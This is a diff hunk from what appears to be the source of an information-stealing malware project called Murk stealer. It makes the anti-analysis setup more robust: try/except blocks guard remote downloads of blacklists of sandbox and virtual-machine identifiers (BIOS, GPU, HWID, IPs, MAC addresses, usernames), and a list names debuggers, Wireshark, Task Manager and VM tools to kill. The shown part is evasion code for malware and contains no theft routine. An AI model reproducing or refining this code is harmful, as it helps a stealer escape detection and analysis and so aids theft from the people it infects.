@@ -21,38 +21,69 @@ import platform
 import json
 
 
-
-blacklisted_Bios = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Bios.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_Manufacture = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Manufacture.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_BaseBoard = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_BaseBoard.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_CPU = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_CPU.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_Drive = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Drive.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_HW_Profile_GUID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_HW_Profile_GUID.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_Machine_GUID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Machine_GUID.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_Processes = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Processes.txt').text.replace('\r', '').split('\n'))
-
+try:
+    blacklisted_Bios = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Bios.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_Bios = []
+try:
+    blacklisted_Manufacture = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Manufacture.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_Manufacture = []
+try:   
+    blacklisted_BaseBoard = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_BaseBoard.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_BaseBoard = []
+try:
+    blacklisted_CPU = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_CPU.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_CPU = []
+try:
+    blacklisted_Drive = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Drive.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_Drive = []
+try:
+    blacklisted_HW_Profile_GUID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_HW_Profile_GUID.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_HW_Profile_GUID = []
+try:
+    blacklisted_Machine_GUID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Machine_GUID.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_Machine_GUID = []
+try:
+    blacklisted_Processes = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Processes.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_Processes = []
+try:
+    blacklisted_GPU = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_GPU.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_GPU = []
+try:
+    blacklisted_HWID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_HWID.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_HWID = []
+try:
+    blacklisted_ip = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_ip.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_ip = []
+try:
+    blacklisted_Mac_Address = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Mac_Address.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_Mac_Address = []
+try:
+    blacklisted_PC_Name = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_PC_Name.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_PC_Name = []
+try:
+    blacklisted_Platform = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Platform.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_Platform = []
+try:
+    blacklisted_Users = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Users.txt').text.replace('\r', '').split('\n'))
+except:
+    blacklisted_Users = []
+    
 kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
 
-blacklisted_GPU = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_GPU.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_HWID = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_HWID.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_ip = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_ip.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_Mac_Address = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Mac_Address.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_PC_Name = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_PC_Name.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_Platform = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Platform.txt').text.replace('\r', '').split('\n'))
-
-blacklisted_Users = list(requests.get('https://raw.githubusercontent.com/Nick-Vinesmoke/The-Murk-stealer/master/for%20anti-debug/blacklisted_Users.txt').text.replace('\r', '').split('\n'))
 
 def checkHWID():
     try:
